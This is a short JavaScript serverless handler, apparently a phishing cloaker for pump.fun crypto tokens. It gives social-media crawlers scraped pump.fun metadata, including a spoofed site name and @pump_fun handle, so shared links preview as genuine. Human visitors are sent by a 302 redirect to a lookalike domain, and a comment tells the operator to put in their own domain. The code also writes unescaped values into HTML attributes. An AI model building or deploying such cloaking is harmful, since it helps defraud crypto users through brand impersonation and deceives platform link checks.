export default async function handler(req, res) {
  let ca = req.query.address || req.url.slice(1).split('?')[0];
  if (!ca || ca.length < 30) return res.status(400).send('Bad address');

  // Check if it's a Twitter bot
  const userAgent = req.headers['user-agent'] || '';
  const isTwitterBot = userAgent.includes('Twitterbot') || 
                       userAgent.includes('facebookexternalhit') ||
                       userAgent.includes('Slackbot') ||
                       userAgent.includes('LinkedInBot');

  // For Twitter bots: serve meta tags
  if (isTwitterBot) {
    try {
      // Fetch the Pump.fun page
      const response = await fetch(`https://pump.fun/coin/${ca}`, {
        headers: { 'User-Agent': 'Mozilla/5.0 (compatible; Twitterbot/1.0)' }
      });
      const html = await response.text();
      
      // Extract title
      let title = html.match(/<title>(.*?)<\/title>/)?.[1] || 'Token on Pump.Fun';
      
      // Extract image - MULTIPLE FALLBACKS for new/unpopular coins
      let img = null;
      
      // Method 1: Look for og:image meta tag
      const ogImageMatch = html.match(/<meta property="og:image" content="([^"]+)"/);
      if (ogImageMatch) img = ogImageMatch[1];
      
      // Method 2: Look for token image in the page (works for new coins)
      if (!img) {
        const tokenImageMatch = html.match(/<img[^>]+src="([^"]+token[^"]+\.(?:png|jpg|jpeg|gif))"/i);
        if (tokenImageMatch) img = tokenImageMatch[1];
      }
      
      // Method 3: Look for any large image on the page
      if (!img) {
        const anyImageMatch = html.match(/<img[^>]+src="([^"]+)"[^>]*>/i);
        if (anyImageMatch) img = anyImageMatch[1];
      }
      
      // Method 4: Use default Pump.fun logo as last resort
      if (!img) img = 'https://pump.fun/logo.png';
      
      // Ensure image URL is absolute
      if (img && img.startsWith('/')) {
        img = `https://pump.fun${img}`;
      }
      
      // Extract description
      let description = html.match(/<meta property="og:description" content="([^"]+)"/)?.[1] || '';
      if (!description) {
        const marketCapMatch = html.match(/\$?([\d.]+[KM]?)\s*(?:market cap|MC)/i);
        if (marketCapMatch) description = `Market Cap: $${marketCapMatch[1]} | Buy on Pump.fun`;
        else description = 'New token on Pump.fun';
      }
      
      // Send the response with meta tags
      res.send(`<!DOCTYPE html>
      <html><head>
        <meta property="og:title" content="${escapeHtml(title)}" />
        <meta property="og:description" content="${escapeHtml(description)}" />
        <meta property="og:image" content="${img}" />
        <meta property="og:site_name" content="Pump.Fun" />
        <meta property="og:url" content="https://pump.fun/coin/${ca}" />
        <meta property="og:type" content="website" />
        <meta name="twitter:card" content="summary_large_image" />
        <meta name="twitter:title" content="${escapeHtml(title)}" />
        <meta name="twitter:description" content="${escapeHtml(description)}" />
        <meta name="twitter:image" content="${img}" />
        <meta name="twitter:site" content="@pump_fun" />
        <title>${escapeHtml(title)}</title>
      </head><body>
        <p>Redirecting...</p>
      </body></html>`);
    } catch (error) {
      // Fallback for any errors
      res.send(`<!DOCTYPE html>
      <html><head>
        <meta property="og:title" content="Token on Pump.Fun" />
        <meta property="og:description" content="Buy on Pump.fun" />
        <meta property="og:image" content="https://pump.fun/logo.png" />
        <meta property="og:site_name" content="Pump.Fun" />
        <meta name="twitter:card" content="summary_large_image" />
      </head><body></body></html>`);
    }
  } else {
    // FOR HUMANS: Redirect to your domain with JUST the CA (no /token/)
    // CHANGE THIS URL TO YOUR DOMAIN
    res.redirect(302, `https://pump.funchats.live/${ca}`);
  }
}

// Helper function to prevent HTML injection
function escapeHtml(str) {
  return str.replace(/[&<>]/g, function(m) {
    if (m === '&') return '&amp;';
    if (m === '<') return '&lt;';
    if (m === '>') return '&gt;';
    return m;
  });
}
